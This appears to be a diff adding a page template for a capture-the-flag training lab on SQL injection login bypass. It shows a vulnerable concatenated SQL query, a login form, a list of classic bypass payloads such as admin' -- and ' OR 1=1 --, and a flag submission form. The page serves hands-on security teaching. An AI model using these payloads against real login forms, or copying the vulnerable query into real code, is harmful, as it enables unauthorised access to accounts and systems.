@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Bypass - EliteHackLab</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav">
+    <div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div>
+    <div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/sqli"><i class="fas fa-flask"></i> SQLi Labs</a></div>
+  </nav>
+  <div class="lab-container">
+    <div class="lab-header">
+      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/sqli">SQL Injection</a> / Login Bypass</div>
+      <h1>💉 SQL Injection - Login Bypass</h1>
+      <div class="lab-info">
+        <span class="lab-tag difficulty-easy">Easy</span>
+        <span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span>
+      </div>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>Bypass the login form using SQL injection to authenticate as the admin user without knowing the password.</p>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-sign-in-alt"></i> Login Form</h2>
+      <form method="POST" action="/labs/sqli/login-bypass" class="vulnerable-form">
+        <label>Username:</label>
+        <input type="text" name="username" placeholder="Enter username" autocomplete="off">
+        <label>Password:</label>
+        <input type="text" name="password" placeholder="Enter password" autocomplete="off">
+        <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
+      </form>
+
+      <% if (message) { %>
+        <div class="<%= success ? 'success-box' : 'warning-box' %>">
+          <%= message %>
+        </div>
+      <% } %>
+
+      <div class="code-block">
+-- Backend Query:
+SELECT * FROM users WHERE username = '$username' AND password = '$password'
+
+-- Classic Bypass Payloads:
+admin' --
+admin' OR '1'='1' --
+' OR 1=1 --
+' OR '1'='1
+      </div>
+    </div>
+
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <p style="color:var(--text-secondary); font-size:0.85rem; margin-bottom:1rem;">Login as admin to get the flag!</p>
+      <form onsubmit="submitFlagInline('sqli-basic', 'flagInput_login', 'flagResult_login'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
+        <input type="text" id="flagInput_login" placeholder="FLAG{...}" autocomplete="off">
+        <button type="submit" class="btn">Submit</button>
+      </form>
+      <div id="flagResult_login" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
